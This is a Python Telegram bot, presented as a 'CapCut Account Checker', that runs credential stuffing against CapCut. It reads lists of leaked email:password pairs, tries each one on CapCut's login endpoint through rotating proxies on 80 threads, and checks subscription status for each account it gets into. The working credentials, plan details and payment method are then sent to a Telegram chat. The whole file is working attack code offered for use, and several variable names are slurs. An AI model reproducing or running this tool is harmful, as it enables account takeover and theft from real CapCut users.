# code by @zx_levi | @binswithtips
# @xDarkLogicx // @xDarkLogicx

import requests
import threading
import time
import json
import re
import random
import asyncio
import os
import io
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Global variables
bomba = 0
kurt = 0
free = 0
amerikaananisikm = 0
ataturkparki = 0
lock = threading.Lock()
stop_flag = False

purna = 3  
hocam = 2  

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"'
}

# States for conversation
COMBO_FILE, PROXY_FILE, ASK_PROXY = range(3)

# Store user data
user_data = {}

def nvidia(message, bataniye, chat_id):
    try:
        bot = Bot(token=bataniye)
        asyncio.run(bot.send_message(chat_id=chat_id, text=message))
    except:
        pass

def supurge(proxy_content):
    proxies = []
    try:
        lines = proxy_content.strip().split('\n')
        for line in lines:
            proxy = line.strip()
            if not proxy:
                continue
            
            try:
                if proxy.count(':') == 3:
                    parts = proxy.split(':')
                    host = parts[0]
                    port = parts[1]
                    username = parts[2]
                    password = parts[3]
                    priz = f"{username}:{password}@{host}:{port}"
                    proxies.append({
                        'original': proxy,
                        'formatted': priz,
                        'type': 'auth',
                        'fail_count': 0,
                        'last_used': 0
                    })
                
                elif '@' in proxy:
                    proxies.append({
                        'original': proxy,
                        'formatted': proxy,
                        'type': 'auth',
                        'fail_count': 0,
                        'last_used': 0
                    })
                
                elif proxy.count(':') == 1:
                    proxies.append({
                        'original': proxy,
                        'formatted': proxy,
                        'type': 'simple',
                        'fail_count': 0,
                        'last_used': 0
                    })
                    
            except Exception as e:
                pass
        
        random.shuffle(proxies)
        
    except Exception as e:
        pass
    
    return proxies

def dikk(octopus):
    try:
        if octopus['type'] == 'auth':
            return {
                'http': f'http://{octopus["formatted"]}',
                'https': f'http://{octopus["formatted"]}'
            }
        else:
            return {
                'http': f'http://{octopus["formatted"]}',
                'https': f'http://{octopus["formatted"]}'
            }
    except:
        return None

def recebivedik(asker, yastik):
    if not asker:
        return None, 0
    
    with lock:
        for i in range(len(asker)):
            idx = (yastik + i) % len(asker)
            proxy = asker[idx]
            
            if proxy['fail_count'] < 5:  
                proxy['last_used'] = time.time()
                return proxy, idx + 1
    
    return asker[0], (yastik + 1) % len(asker)

def batmanpark(octopus):
    if octopus:
        octopus['fail_count'] += 1

def lezo(octopus):
    if octopus:
        octopus['fail_count'] = max(0, octopus['fail_count'] - 1)  

def ecnereadsaddads(line):
    line = line.strip()
    if ':' in line:
        return line.split(':', 1)
    return None, None

def ssanna(zuman, format="%Y-%m-%d"):
    try:
        zuman = int(zuman)
        return datetime.fromtimestamp(zuman).strftime(format)
    except:
        return "N/A"

def ayakkabi(source, left, right):
    try:
        if isinstance(source, str):
            start = source.find(left)
            if start == -1:
                return None
            start += len(left)
            end = source.find(right, start)
            if end == -1:
                return None
            return source[start:end].strip()
        return None
    except:
        return None

def tego(email, password, asker, dfr4):
    global ataturkparki
    
    iran = 0
    bokisrail = None
    yastik = dfr4
    
    while iran < purna:
        try:
            octopus, next_index = recebivedik(asker, yastik)
            yastik = next_index
            
            proxies = dikk(octopus) if octopus else None
            
            session = requests.Session()
            session.headers.update(HEADERS)
            
            if proxies:
                try:
                    abdd = session.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
                    if abdd.status_code != 200:
                        batmanpark(octopus)
                        iran += 1
                        time.sleep(hocam)
                        continue
                except:
                    batmanpark(octopus)
                    with lock:
                        ataturkparki += 1
                    iran += 1
                    time.sleep(hocam)
                    continue
            
            dasdsafe = "https://www.capcut.com/passport/web/email/login/?aid=348188&account_sdk_source=web&passport_jssdk_version=1.0.7-beta.2&language=en&verifyFp=verify_mbf3u5tl_oZllcT6P_XZ9g_4WNW_A2UT_Sibk0A4qyiRE"
            
            abla = {
                "host": "www.capcut.com",
                "x-tt-passport-csrf-token": "d02afa0bff281ee9dcdc36aa3aa38d8f",
                "origin": "https://www.capcut.com",
                "referer": "https://www.capcut.com/login?enter_from=log_out&current_page=work_space",
                "content-type": "application/x-www-form-urlencoded"
            }
            
            dfsfdsfsd = f"mix_mode=1&email={email}&password={password}&fixed_mix_mode=1"
            
            akillliyarrrak = session.post(
                dasdsafe,
                data=dfsfdsfsd,
                headers=abla,
                proxies=proxies,
                timeout=10
            )
            
            pere = akillliyarrrak.text
            
            if '"message":"success"' in pere or '"app_id"' in pere or '"user_id"' in pere:
                if octopus:
                    lezo(octopus)
                
                return {
                    'success': True,
                    'response': pere,
                    'proxy_info': octopus,
                    'session': session
                }
            
            elif 'Username or password doesn\'t match our records' in pere or '"error_code":1009' in pere or '"message":"error"' in pere:
                if octopus:
                    lezo(octopus)
                
                return {
                    'success': False,
                    'bad_creds': True,
                    'response': pere,
                    'proxy_info': octopus
                }
            
            else:
                if octopus:
                    batmanpark(octopus)
                iran += 1
                time.sleep(hocam)
                
        except requests.exceptions.ProxyError:
            if octopus:
                batmanpark(octopus)
            with lock:
                ataturkparki += 1
            iran += 1
            time.sleep(hocam)
            
        except requests.exceptions.Timeout:
            if octopus:
                batmanpark(octopus)
            iran += 1
            time.sleep(hocam)
            
        except Exception as e:
            bokisrail = str(e)
            if octopus:
                batmanpark(octopus)
            iran += 1
            time.sleep(hocam)
    
    return {
        'success': False,
        'bad_creds': False,
        'error': bokisrail or 'Max retries reached'
    }

def burnna(email, password, ocotopise, bataniye, chat_id, asker, dfr4, context):
    global bomba, kurt, free, amerikaananisikm, stop_flag
    
    if stop_flag:
        return dfr4 + 1
    
    result = tego(email, password, asker, dfr4)
    
    if result.get('success'):
        session = result['session']
        pere = result['response']
        octopus = result.get('proxy_info')
        
        sdasf = ayakkabi(pere, '"app_id":', ',"')
        ciger = ayakkabi(pere, '"screen_name":"', '"')
        
        if not ciger:
            ciger = "N/A"
        
        try:
            ayran = "https://commerce-api-sg.capcut.com/commerce/v3/trade/subscription_infos"
            
            kebap = json.dumps({
                "scene": ["vip"],
                "vip_levels": ["vip"],
                "app_id": sdasf
            })
            
            lahmacun = {
                "Host": "commerce-api-sg.capcut.com",
                "sign-ver": "1",
                "sign": "2832a2ea2f27fad70d2d050280945b91",
                "pf": "7",
                "tdid": "",
                "loc": "CA",
                "Content-Type": "application/json",
                "appvr": "12.4.0",
                "app-sdk-version": "48.0.0",
                "appid": sdasf,
                "lan": "en",
                "device-time": str(int(time.time())),
                "Origin": "https://www.capcut.com",
                "Referer": "https://www.capcut.com/"
            }
            
            proxies = dikk(octopus) if octopus else None
            
            lolsesas = session.post(
                ayran,
                data=kebap,
                headers=lahmacun,
                proxies=proxies,
                timeout=10
            )
            
            sehpa = lolsesas.text
            
            battlefield = ayakkabi(sehpa, '"display_subscription_info":"', '",')
            ayak = ayakkabi(sehpa, '"amount":', ',"')
            currency = ayakkabi(sehpa, '"currency_code":"', '",')
            sdsadas = ayakkabi(sehpa, '"payment_method":"', '"')
            
            motorrr = ayakkabi(sehpa, '"vip_end_time":', ',"')
            kaskk = ssanna(motorrr) if motorrr else "N/A"
            
            saksoo = False
            if battlefield and "Pro" not in battlefield:
                saksoo = True
            
            captured = f"{ciger} | {battlefield or 'Abonelik Yok'} | {ayak or '0'} {currency or ''} | {sdsadas or 'N/A'} | Exp: {kaskk}"
            
            mahsumkirmizi = "HIT"
            if saksoo:
                mahsumkirmizi = "FREE"
            
            with lock:
                if saksoo:
                    free += 1
                else:
                    bomba += 1
                amerikaananisikm += 1
            
            if bataniye and chat_id:
                octopis = f"""💎 {mahsumkirmizi} - CAPCUT
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊              
🔱 Hesap: {email}:{password}
🔱 Nick: {ciger}
🔱 Abonelik: {battlefield or 'Abonelik Yok '}
🔱 Tutar: {ayak or '0'} {currency or ''}
🔱 Ödeme: {sdsadas or '?'}
🔱 Bitiş: {kaskk}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @zx_levi | @binswithtips
"""
                
                nvidia(octopis, bataniye, chat_id)
                
        except Exception as e:
            with lock:
                bomba += 1  
                amerikaananisikm += 1
    
    elif result.get('bad_creds'):
        with lock:
            kurt += 1
            amerikaananisikm += 1
    
    else:
        with lock:
            kurt += 1
            amerikaananisikm += 1
    
    return dfr4 + 1

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **CapCut Account Checker Bot**\n\n"
        "Commands:\n"
        "/check - Start checking process\n"
        "/stop - Stop checking\n"
        "/status - Check status\n\n"
        "code by @zx_levi | @binswithtips",
        parse_mode='Markdown'
    )

async def check_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📁 Send combo file (txt format: email:pass)")
    return COMBO_FILE

async def receive_combo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    combo_bytes = await file.download_as_bytearray()
    combo_content = combo_bytes.decode('utf-8', errors='ignore')
    
    user_id = update.effective_user.id
    user_data[user_id] = {'combo': combo_content, 'proxy': None}
    
    await update.message.reply_text("✅ Combo received!\n\nUse proxy? Reply YES or NO")
    return ASK_PROXY

async def ask_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    response = update.message.text.upper()
    
    if response == "YES":
        await update.message.reply_text("📁 Send proxy file (txt format)")
        return PROXY_FILE
    else:
        await update.message.reply_text("🚀 Starting check without proxy...")
        asyncio.create_task(run_check(user_id, update.effective_chat.id, context))
        return ConversationHandler.END

async def receive_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    proxy_bytes = await file.download_as_bytearray()
    proxy_content = proxy_bytes.decode('utf-8', errors='ignore')
    
    user_id = update.effective_user.id
    user_data[user_id]['proxy'] = proxy_content
    
    await update.message.reply_text("✅ Proxy received! 🚀 Starting check...")
    asyncio.create_task(run_check(user_id, update.effective_chat.id, context))
    return ConversationHandler.END

async def run_check(user_id, chat_id, context):
    global bomba, kurt, free, amerikaananisikm, stop_flag
    
    # Reset counters
    bomba = 0
    kurt = 0
    free = 0
    amerikaananisikm = 0
    stop_flag = False
    
    data = user_data.get(user_id, {})
    combo_content = data.get('combo', '')
    proxy_content = data.get('proxy')
    
    combos = [line.strip() for line in combo_content.split('\n') if line.strip()]
    asker = supurge(proxy_content) if proxy_content else []
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"🚀 Starting check...\nTotal combos: {len(combos)}\nProxies: {len(asker)}"
    )
    
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    esad = 0
    
    with ThreadPoolExecutor(max_workers=80) as executor:
        futures = []
        for combo in combos:
            if stop_flag:
                break
            email, password = ecnereadsaddads(combo)
            if email and password:
                futures.append(executor.submit(
                    burnna, 
                    email, password, 
                    combo, 
                    BOT_TOKEN, 
                    chat_id,
                    asker,
                    esad,
                    context
                ))
                esad = (esad + 1) % len(asker) if asker else 0
        
        for future in futures:
            if stop_flag:
                break
            future.result()
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"✅ Check Complete!\n\n💎 Premium: {bomba}\n🆓 Free: {free}\n❌ Bad: {kurt}\n📊 Total: {amerikaananisikm}"
    )

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    stop_flag = True
    await update.message.reply_text("🛑 Stopping... Please wait.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📊 Status:\n💎 Premium: {bomba}\n🆓 Free: {free}\n❌ Bad: {kurt}\n📊 Total: {amerikaananisikm}"
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled")
    return ConversationHandler.END

def main():
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('check', check_start)],
        states={
            COMBO_FILE: [MessageHandler(filters.Document.TEXT, receive_combo)],
            ASK_PROXY: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_proxy)],
            PROXY_FILE: [MessageHandler(filters.Document.TEXT, receive_proxy)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('stop', stop_check))
    application.add_handler(CommandHandler('status', status))
    application.add_handler(conv_handler)
    
    print("Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()